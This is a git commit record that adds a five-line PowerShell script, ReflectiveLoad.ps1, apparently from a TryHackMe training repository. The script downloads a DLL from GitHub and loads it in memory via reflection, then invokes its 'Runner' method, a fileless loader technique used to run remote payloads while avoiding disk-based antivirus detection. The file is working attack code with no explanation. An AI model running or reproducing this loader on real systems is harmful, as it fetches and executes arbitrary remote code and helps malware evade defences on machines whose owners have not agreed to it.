8c540ee3735af1c1f37f1c662a635e878a232a5d
P4BNS <125688496+P4BNS@users.noreply.github.com>
2023-02-21 08:56:09 -0500

    Add files via upload

---
+++ ReflectiveLoad.ps1
@@ -0,0 +1,5 @@
+$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/P4BNS/THM/raw/main/ClassLibrary1.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType('ClassLibrary1.Class1')
+$method = $class.GetMethod('Runner')
+$method.Invoke(0, $null)
